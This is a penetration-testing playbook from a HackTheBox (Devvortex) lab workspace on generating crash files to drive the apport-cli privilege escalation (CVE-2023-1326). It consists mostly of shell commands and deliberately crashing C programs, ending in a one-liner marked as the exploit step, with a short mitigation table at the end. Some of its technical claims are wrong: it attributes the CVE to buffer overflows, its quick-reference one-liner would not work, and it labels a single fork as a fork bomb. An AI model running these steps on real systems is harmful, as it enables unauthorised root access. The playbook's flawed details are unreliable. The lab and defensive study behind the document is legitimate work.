# Crash File Generation Playbook

> **Purpose:** Techniques for creating crash reports that trigger apport-cli processing for privilege escalation.

---

## 1. What Is This Technique?

Crash file generation is the technique of creating core dump or crash report files that will be processed by system crash handlers (like `apport` on Ubuntu). This is primarily used in privilege escalation chains where:

1. A vulnerable binary processes crash files unsafely
2. The crash file can be crafted to trigger buffer overflows
3. Processing occurs with elevated privileges (root)

**Primary Use Case:** CVE-2023-1326 (apport-cli) exploitation
**Alternative Use:** Any vulnerability in crash report parsers

---

## 2. When to Use This Technique

| Scenario | Indicator | Action |
|---|---|---|
| apport-cli privesc | Binary found with SUID bit | Generate crash file |
| Crash handler vulnerability | `/usr/bin/apport-cli` exists | Create crafted crash |
| Write access to /var/crash | Directory writable | Place crash file |
| Need to trigger crash | No existing crash file | Generate new crash |
| Process crash needed | Any vulnerable parser | Create core dump |

---

## 3. How to Execute

### Method 1: Signal-Based Crash (Sleep & Kill)

The most reliable method from Devvortex - uses a background process that crashes on signal delivery:

```bash
# Step 1: Start a simple process that will sleep
sleep 100 &
# Record the PID
SLEEP_PID=$!
echo "Background sleep PID: $SLEEP_PID"

# Step 2: Give it a moment
sleep 0.5

# Step 3: Send SIGSEGV (signal 11) to trigger crash
kill -11 $SLEEP_PID

# Step 4: Wait for apport to process the crash
sleep 2

# Step 5: Check for generated crash file
ls -la /var/crash/
```

**Why This Works:**
- `sleep` is a simple, stable binary that reliably crashes
- Signal 11 (SIGSEGV) causes a segmentation fault
- `apport` daemon intercepts crash and creates `.crash` file
- Crash file is owned by the user who ran the process

### Method 2: Program That Crashes

Create a program that intentionally segfaults:

```bash
# Create crashing C program
cat > /tmp/crash.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

int main() {
    printf("About to crash...\n");
    // Dereference NULL pointer - guaranteed segfault
    int *null_ptr = NULL;
    *null_ptr = 42;
    return 0;
}
EOF

# Compile it
gcc /tmp/crash.c -o /tmp/crash

# Make it executable
chmod +x /tmp/crash

# Run it (it will crash and apport will capture)
/tmp/crash

# Check crash file
ls -la /var/crash/
```

### Method 3: Fork Bomb Variant

Create a process that crashes after forking:

```bash
# Create a program that forks and then crashes child
cat > /tmp/forkcrash.c << 'EOF'
#include <unistd.h>
#include <stdlib.h>

int main() {
    pid_t pid = fork();
    if (pid == 0) {
        // Child process - crash immediately
        int *p = NULL;
        *p = 1;
    } else {
        // Parent - wait for child
        sleep(1);
    }
    return 0;
}
EOF

gcc /tmp/forkcrash.c -o /tmp/forkcrash
/tmp/forkcrash
sleep 1
ls -la /var/crash/
```

### Method 4: Using gdb for Core Dump

Generate a core dump file directly:

```bash
# Find target process
ps aux | grep <process_name>

# Create core dump
gdb -p <PID> -ex "generate-core-file /tmp/exploit.core" -batch

# The core file can be renamed to .crash and processed
```

### Method 5: ulimit Core Dump

```bash
# Enable core dumps
ulimit -c unlimited

# Run crashing program
/tmp/crash

# Find core file
find / -name "core.*" -type f 2>/dev/null

# May be in current directory or /var/crash depending on config
```

---

## 4. Crash File Location and Permissions

### Understanding /var/crash

```bash
# Check directory permissions
ls -ld /var/crash/
# drwxrwxrwt 3 root root 4096 Mar 20 10:21 /var/crash/

# List existing crash files
ls -la /var/crash/

# Understand file format
file /var/crash/*.crash

# View crash file structure (text-based)
head -50 /var/crash/*.crash
```

### Crash File Format

Apport crash files are compressed and contain:
- `ProblemType:` - Type of crash
- `ExecutablePath:` - Path to crashed binary
- `Signal:` - Signal number (11 = SIGSEGV)
- `Architecture:` - System architecture
- `Date:` - Crash timestamp
- Compressed core dump data

---

## 5. Common Commands Reference

### Quick Exploitation Sequence

```bash
# ONE-LINER: Generate crash and exploit
(sleep 999 &) && sleep 0.1 && kill -11 $(pgrep -f "sleep 999") && sleep 2 && apport-cli -c $(ls -t /var/crash/*.crash | head -1)

# EXPLAINED VERSION:
# 1. Start background sleep
sleep 999 &
# 2. Crash it with SIGSEGV  
kill -11 $(pgrep -f "sleep 999")
# 3. Wait for crash file
sleep 2
# 4. Get latest crash file
CRASH=$(ls -t /var/crash/*.crash | head -1)
# 5. Exploit
apport-cli -c "$CRASH"
```

### Debugging Crash Generation

```bash
# Check if apport is running
systemctl status apport 2>/dev/null || ps aux | grep apport

# Check apport configuration
cat /etc/default/apport

# Enable/disable apport
systemctl start apport
systemctl stop apport

# Check crash file ownership
ls -la /var/crash/
stat /var/crash/*.crash

# Verify crash is logged
cat /var/log/apport.log 2>/dev/null
journalctl -u apport 2>/dev/null
```

### Alternative Signal Numbers

```bash
# SIGSEGV - Segmentation fault (most common)
kill -11 <PID>

# SIGABRT - Abort signal
kill -6 <PID>

# SIGFPE - Floating point exception
kill -8 <PID>

# SIGILL - Illegal instruction
kill -4 <PID>

# SIGBUS - Bus error
kill -7 <PID>
```

---

## 6. Devvortex-Specific Notes

In the Devvortex box:

```
Technique: sleep & kill -11 combination
Rationale: Simple, reliable, leaves minimal footprint
Result: Crash file in /var/crash/ owned by user
Next Step: apport-cli -c triggers privilege escalation
```

**Why sleep works well:**
- Universal binary (POSIX standard)
- Predictable behavior
- No special dependencies
- Clean crash on signal delivery

---

## 7. Troubleshooting

| Problem | Cause | Solution |
|---|---|---|
| No crash file created | apport not running | `systemctl start apport` |
| /var/crash not writable | Permission denied | Check directory permissions |
| Crash file wrong owner | Different user crashed | Must crash YOUR process |
| apport-cli not in path | Binary elsewhere | `find / -name apport-cli` |
| Crash file empty | Compression failed | Check disk space |

---

## 8. Prevention/Mitigation

| Defense | Implementation |
|---|---|
| Disable apport | `systemctl disable apport` |
| Restrict /var/crash | Stricter permissions on directory |
| Disable SUID crash handling | `/proc/sys/kernel/suid_dumpable = 0` |
| AppArmor profile | Restrict apport-cli capabilities |
| Core dump restrictions | `ulimit -c 0` for users |
| Monitor crash files | File integrity monitoring on /var/crash |

---

## 9. Quick Reference Card

```
┌─────────────────────────────────────────────────────────┐
│           CRASH FILE GENERATION QUICK REF               │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  SIGNAL NUMBERS:                                        │
│  SIGSEGV = 11  (Segmentation fault)  ← MOST COMMON     │
│  SIGABRT = 6   (Abort)                                 │
│  SIGFPE  = 8   (Floating point error)                   │
│  SIGILL  = 4   (Illegal instruction)                    │
│  SIGBUS  = 7   (Bus error)                              │
│                                                         │
│  QUICK COMMANDS:                                        │
│  sleep 999 &              Start background process      │
│  kill -11 $(pgrep sleep)  Send SIGSEGV                 │
│  ls -la /var/crash/       Find crash file               │
│  apport-cli -c <file>     Process crash (exploit)      │
│                                                         │
│  ONE-LINER:                                              │
│  (sleep 999 &) && kill -11 $! && sleep 2               │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

**Author:** Ceil (openclaw/neo workspace)  
**Source Box:** Devvortex (HTB)  
**Related:** [apport-cli-privesc.md](./apport-cli-privesc.md), [privesc-linux.md](./privesc-linux.md)
